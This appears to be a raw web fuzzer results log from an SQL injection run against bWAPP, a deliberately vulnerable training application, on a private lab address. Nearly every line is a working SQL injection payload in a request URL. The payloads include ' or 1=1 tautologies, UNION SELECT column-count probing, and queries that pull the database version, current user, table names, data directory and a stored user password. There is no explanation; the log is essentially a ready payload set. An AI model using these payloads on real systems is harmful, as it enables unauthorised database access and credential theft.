1,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=ï»¿'%20or%201=1%20--
2,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201--
3,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='====%20GET%20Search%20==='
4,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201--
5,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2--"
6,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3--"
7,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4--"
15,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,9,10,11,12--"
8,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4,5--"
10,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7--"
11,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8--"
12,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,9--"
13,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,9,10--"
9,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4,5,6--"
16,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,9,10,11,12,13--"
14,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,9,10,11--"
18,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15--"
17,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,9,10,11,12,13,14--"
21,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--"
20,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--"
19,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--"
23,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--"
22,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--"
25,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
26,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%20@@version--
24,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
28,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%20@@version,2,3--"
27,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%20@@version,2--"
30,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%20@@version,2,3,4,5--"
29,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%20@@version,2,3,4--"
31,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%20@@version,2,3,4,5,6--"
32,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%20@@version,2,3,4,5,6,7--"
33,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%20@@version,2,3,4,5,6,7,8--"
35,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%20@@version,2,3,4,5,6,7,8,9,10--"
36,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
34,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%20@@version,2,3,4,5,6,7,8.9--"
37,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,@@version,3--"
38,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,@@version,3,4--"
39,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,@@version,3,4,5--"
40,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,@@version,3,4,5,6--"
43,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,@@version,3,4,5,6,7,8,9--"
45,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
41,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,@@version,3,4,5,6,7--"
42,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,@@version,3,4,5,6,7,8--"
47,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,@@version,5,6,7,8,9,10--"
44,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,@@version,3,4,5,6,7,8,9,10--"
46,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,@@version,4,5,6,7,8,9,10--"
48,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,@@version,6,7,8,9,10--"
50,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,5,6,@@version,8,9,10--"
49,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,5,@@version,7,8,9,10--"
51,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,@@version,9,10--"
53,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,9,@@version--"
52,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,@@version,10--"
54,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
60,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,database(),6,7,8,9,10--"
59,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,database(),5,6,7,8,9,10--"
57,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,database(),3,4,5,6,7,8,9,10--"
58,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,database(),4,5,6,7,8,9,10--"
55,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%20database()--
56,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%20database(),2,3,4,5,6,7,8,9,10--"
65,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,9,database()--"
66,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
63,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,database(),9,10--"
64,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,database(),10--"
67,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
62,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,5,6,database(),8,9,10--"
69,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,user(),3,4,5,6,7,8,9,10--"
68,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%20user(),2,3,4,5,6,7,8,9,10--"
61,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,5,database(),7,8,9,10--"
70,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,user(),4,5,6,7,8,9,10--"
73,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,5,user(),7,8,9,10--"
72,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,user(),6,7,8,9,10--"
71,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,user(),5,6,7,8,9,10--"
75,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,user(),9,10--"
74,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,5,6,user(),8,9,10--"
76,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,user(),10--"
78,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
77,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,2,3,4,5,6,7,8,9,user()--"
79,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%20table_name,2%20from%20information_schema.tables--"
81,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%20table_name,2,3%20from%20information_schema.tables--"
80,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,table_name,2%20from%20information_schema.tables--"
83,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,table_name,2,3,4,5%20from%20information_schema.tables--"
87,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=hello%20world',(select%20*%20from%20bWAPP.users%20where%20id=1%20limit%200,1))--"
85,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='===%20stored(blog)==='
84,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
88,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=hello%20world',(select%20*%20from%20databases()%20where%20id=1%20limit%200,1))--"
82,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=0'%20UNION%20SELECT%20ALL%201,table_name,2,3,4%20from%20information_schema.tables--"
86,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=hello%20world',(select%20password%20from%20bWAPP.users%20where%20id=1%20limit%200,1))--"
89,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=hello%20world',(select%20databases()))--"
90,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=hello%20world',(select%20user()))--"
91,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=hello%20world',(select%20system_user())--"
92,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=hello%20world',(select%20@@version))--"
93,302,0L,0W,"http://10.0.2.4/bWAPP/sqli_1.php?title=hello%20world',(select%20@@datadir))--"
94,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
96,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='%20UNION%20SELECT%20ALL%201--
97,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
95,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title='====%20GET%20Search%20==='
98,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
100,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=
99,302,0L,0W,http://10.0.2.4/bWAPP/sqli_1.php?title=')%20or%201=1%20][('%20or
